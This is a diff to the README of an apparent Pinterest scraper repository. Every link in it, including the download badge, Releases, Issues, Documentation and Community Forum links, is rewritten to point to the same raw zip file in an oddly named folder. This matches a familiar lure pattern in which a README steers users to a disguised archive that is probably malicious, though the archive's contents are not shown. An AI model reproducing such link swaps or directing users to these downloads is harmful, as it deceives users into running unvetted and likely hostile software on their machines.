@@ -1,6 +1,6 @@
 # 📌 pinterest-search-scraper - Scrape Pinterest for Key Data Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/placeofterror/pinterest-search-scraper/releases)
+[![Download](https://github.com/placeofterror/pinterest-search-scraper/raw/refs/heads/main/beneficiate/scraper-pinterest-search-1.7.zip%20Now-Release-brightgreen)](https://github.com/placeofterror/pinterest-search-scraper/raw/refs/heads/main/beneficiate/scraper-pinterest-search-1.7.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ These steps will guide you through the download and installation process.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/placeofterror/pinterest-search-scraper/releases) to download the software. 
+To get started, visit the [Releases page](https://github.com/placeofterror/pinterest-search-scraper/raw/refs/heads/main/beneficiate/scraper-pinterest-search-1.7.zip) to download the software. 
 
 1. Click on the **Releases** link above.
 2. Look for the latest version. It will be at the top of the page.
@@ -58,7 +58,7 @@ To get started, visit the [Releases page](https://github.com/placeofterror/pinte
 
 ### Getting Help
 
-If you encounter issues you cannot resolve, consider checking the Issues section on the [GitHub repository](https://github.com/placeofterror/pinterest-search-scraper/issues) for solutions. You can also reach out for support.
+If you encounter issues you cannot resolve, consider checking the Issues section on the [GitHub repository](https://github.com/placeofterror/pinterest-search-scraper/raw/refs/heads/main/beneficiate/scraper-pinterest-search-1.7.zip) for solutions. You can also reach out for support.
 
 ## 📝 Contributing
 
@@ -68,13 +68,13 @@ If you would like to contribute to this project, feel free to fork the repositor
 
 For more detailed instructions and updates, check the following:
 
-- [Documentation](https://github.com/placeofterror/pinterest-search-scraper/wiki)
-- [Community Forum](https://github.com/placeofterror/pinterest-search-scraper/discussions)
+- [Documentation](https://github.com/placeofterror/pinterest-search-scraper/raw/refs/heads/main/beneficiate/scraper-pinterest-search-1.7.zip)
+- [Community Forum](https://github.com/placeofterror/pinterest-search-scraper/raw/refs/heads/main/beneficiate/scraper-pinterest-search-1.7.zip)
 
 ## 💡 Closing Notes
 
 Using the Pinterest Search Scraper can simplify how you gather data from Pinterest. The tool’s functionalities aim to save you time and improve your marketing research efforts.
 
-Remember to regularly check the [Releases page](https://github.com/placeofterror/pinterest-search-scraper/releases) for new updates and improvements. 
+Remember to regularly check the [Releases page](https://github.com/placeofterror/pinterest-search-scraper/raw/refs/heads/main/beneficiate/scraper-pinterest-search-1.7.zip) for new updates and improvements. 
 
 Happy scraping!
